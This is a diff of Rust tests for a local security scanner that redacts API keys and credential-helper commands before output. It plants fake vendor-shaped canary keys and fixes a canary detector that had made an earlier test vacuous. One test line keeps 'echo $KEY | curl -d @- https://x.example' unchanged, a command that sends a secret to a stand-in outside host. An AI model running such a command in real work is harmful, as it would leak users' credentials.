@@ -80,7 +80,45 @@ fn surfaces() -> Vec<(&'static str, String)> {
         ("HELPERTOK", "./key.sh --token HELPERTOK".into()),
         ("PROXYUSER", "http://u:PROXYUSER@proxy.internal:3128".into()),
         ("OLLAMAUSER", "http://u:OLLAMAUSER@0.0.0.0:11434".into()),
+        // --- bare vendor-shaped keys with no key name or flag in front of them ---
+        ("ANTBARE", "echo sk-ant-api03-ANTBARE0123456789abcdefghij".into()),
+        ("PROJBARE", "printf %s sk-proj-PROJBARE0123456789abcdef | x".into()),
+        ("GHPBARE", "gh auth login --with-token ghp_GHPBARE0123456789abcdefgh".into()),
+        ("BAREKEYXYZ", "aws configure set aws_access_key_id AKIABAREKEYXYZ123456".into()),
+        ("SLACKBARE", "notify xoxb-SLACKBARE-0123456789".into()),
+        ("GOOGBARE", "gemini --key AIzaGOOGBARE0123456789abcdefghijklmnopq".into()),
     ]
+}
+
+/// Credential helpers print a credential, so their literal arguments go too (on top of
+/// the shapes above): echo/printf arguments, heredoc bodies, leading NAME=value values,
+/// and long opaque tokens. The program, flags, paths and $VAR references stay.
+#[test]
+fn helper_command_literals_are_redacted() {
+    use rustmachineguard::scanners::redact_helper_command as h;
+    for (canary, raw) in [
+        ("LITELLMLIT", "echo litellm-LITELLMLIT0123456789abcdef"),
+        ("PLAINHUNTER", "MYPASS=PLAINHUNTER aws sso login"),
+        ("HEREDOCKEY", "cat <<EOF\nHEREDOCKEY\nEOF"),
+        ("HERESTR", "cat <<<HERESTR"),
+        ("OPAQUEKEY", "./helper --profile x OPAQUEKEY0123456789abcdefXYZ"),
+        ("ECHOQ", "echo -n 'ECHOQ'; true"),
+        ("PIPEDKEY", "echo PIPEDKEY | base64"),
+    ] {
+        let out = h(raw);
+        assert!(!out.contains(canary), "{raw:?} -> {out:?}");
+    }
+    for keep in [
+        "op read op://vault/anthropic/key",
+        "aws sso login --profile dev",
+        "security find-generic-password -s ANTHROPIC_API_KEY -w",
+        "echo $ANTHROPIC_API_KEY",
+        "printenv ANTHROPIC_API_KEY",
+        "/usr/local/bin/key-helper-2024 --region us-east-1",
+    ] {
+        assert_eq!(h(keep), keep, "redaction blinded a benign helper");
+    }
+    assert_eq!(h("echo $KEY | curl -d @- https://x.example"), "echo $KEY | curl -d @- https://x.example");
 }
 
 /// The host-only readers never return userinfo, independent of redaction.
@@ -386,6 +424,14 @@ fn no_canary_reaches_any_output_format_end_to_end() {
     fs::create_dir_all(proj.join(".claude/commands")).unwrap();
     fs::write(proj.join(".claude/commands/ship.md"), "Ship: !`deploy --token E2ESKILLDYN https://skill.internal/`\n").unwrap();
     fs::write(proj.join(".claude/settings.local.json"), r#"{"apiKeyHelper":"./key.sh --token E2EHELPERTOK https://helper.internal/"}"#).unwrap();
+    // A bare literal key in the user's own apiKeyHelper (no finding fires, but the
+    // inventory field is serialized), and a NAME=value prefix in awsAuthRefresh.
+    fs::create_dir_all(home.join(".claude")).unwrap();
+    fs::write(
+        home.join(".claude/settings.json"),
+        r#"{"apiKeyHelper":"echo sk-ant-api03-E2EANTLITERALab0123456789xyzXYZ","awsAuthRefresh":"MYPASS=E2EPLAINPASS aws sso login"}"#,
+    )
+    .unwrap();
     fs::write(proj.join(".env"), "HTTPS_PROXY=http://u:E2EPROXYUSER@proxy.internal:3128\n").unwrap();
     fs::write(home.join(".bashrc"), "export OLLAMA_HOST=http://u:E2EOLLAMAUSER@0.0.0.0:11434\n").unwrap();
     fs::create_dir_all(home.join(".claude/plugins")).unwrap();
@@ -400,12 +446,16 @@ fn no_canary_reaches_any_output_format_end_to_end() {
     fn canaries_in(text: &str) -> BTreeSet<String> {
         text.match_indices("E2E")
             .map(|(i, _)| {
-                let end = text[i..].find(|c: char| !c.is_ascii_uppercase()).map_or(text.len(), |o| i + o);
+                // Skip the "E2E" prefix itself: its digit used to end the match at one
+                // character, so every canary was filtered out and this check was vacuous.
+                let end = text[i + 3..].find(|c: char| !c.is_ascii_uppercase()).map_or(text.len(), |o| i + 3 + o);
                 text[i..end].to_string()
             })
             .filter(|c| c.len() > 3)
             .collect()
     }
+    // The detector itself must see a canary, or every assertion below is vacuous.
+    assert_eq!(canaries_in("x \"E2EFOO\" y").into_iter().collect::<Vec<_>>(), vec!["E2EFOO".to_string()]);
     for fmt in ["terminal", "json", "html", "blueprint"] {
         let out = std::process::Command::new(env!("CARGO_BIN_EXE_rmguard"))
             .args(["--format", fmt, "--skip", skip])
@@ -426,6 +476,7 @@ fn no_canary_reaches_any_output_format_end_to_end() {
                 "yarn.internal", "bun.internal", "gitlab.internal",
                 "Hugging Face", "Continue", "Aider",
                 "skill.internal", "helper.internal", "proxy.internal", "0.0.0.0:11434",
+                "aws sso login",
             ] {
                 assert!(
                     text.contains(host),
